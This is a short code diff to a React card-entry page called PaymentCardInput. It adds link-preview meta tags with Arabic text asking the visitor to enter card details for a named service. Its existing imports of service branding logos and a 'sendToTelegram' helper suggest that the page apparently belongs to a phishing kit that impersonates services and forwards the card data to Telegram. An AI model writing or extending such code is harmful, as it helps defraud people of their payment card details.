@@ -7,6 +7,7 @@ import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@
 import { getServiceBranding } from "@/lib/serviceLogos";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { useLink } from "@/hooks/useSupabase";
+import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { CreditCard, AlertCircle, ArrowLeft, CheckCircle2 } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
@@ -196,6 +197,14 @@ const PaymentCardInput = () => {
   };
   
   return (
+    <>
+      <PaymentMetaTags 
+        serviceName={serviceName}
+        serviceKey={serviceKey}
+        amount={formattedAmount}
+        title={`بيانات البطاقة - ${serviceName}`}
+        description={branding.description || `أدخل بيانات البطاقة لخدمة ${serviceName}`}
+      />
     <DynamicPaymentLayout
       serviceName={serviceName}
       serviceKey={serviceKey}
@@ -400,6 +409,7 @@ const PaymentCardInput = () => {
         <input type="text" name="timestamp" />
       </form>
     </DynamicPaymentLayout>
+    </>
   );
 };
 
